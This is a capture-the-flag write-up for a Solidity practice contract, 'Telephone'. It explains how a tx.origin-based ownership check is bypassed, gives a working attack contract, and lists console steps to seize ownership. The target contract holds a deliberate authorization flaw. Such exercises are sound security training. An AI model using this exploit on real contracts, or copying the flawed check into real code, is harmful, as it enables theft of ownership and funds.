**Description**
The goal of this challenge is to claim the ownershio of the `Telephone` contract.


* Telephone.sol
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

```

**Attack Vector**
The main issue is relying on `tx.origin == msg.sender` to implement authorization, as it can be bypassed easily by calling it from another contract.

**Attack Scenario**
* Attack.sol
```solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// importing the Telephone contract so we can use its functions
import "./Telephone.sol";

contract Attack {
    // Creating an instance of the contract
    Telephone Tel;
    // Constructor takes an address as argument and passes it to the instance.
    // the instance then takes the malicious address se we can access the Telephone Contract's functions.
    constructor(address _Add)  {
        Tel = Telephone(_Add);
    }
    // changing the owner address to our malicious address.
    function changeowner(address _Add) public {
        Tel.changeOwner(_Add);
    }
}
```

- First, we can check the current contract owner by using this command in the console: `await contract.owner()`
![](https://i.imgur.com/jXwSC46.png)

- now that we know the current owner, we should deploy the attack contract on Remix using injected provider to use Metamask.
![](https://i.imgur.com/d7Bi4Kc.png)

- After we successfully connect Metamask and Remix, it's time now to deploy the Attack contract using the Telephone contract Address as input in the Deploy field. we can get the address using the following command: `await contract.address`
![](https://i.imgur.com/IED6JRa.png)

- now we can go to Metamask and and copy our Address, feed it to `changeOwner` and validate the transaction.
![](https://i.imgur.com/Ub3rXL8.png)

- By entering `await contract.owner` again, we can see that our Address is the new owner of the contract.

![](https://i.imgur.com/FWd4Hd5.png)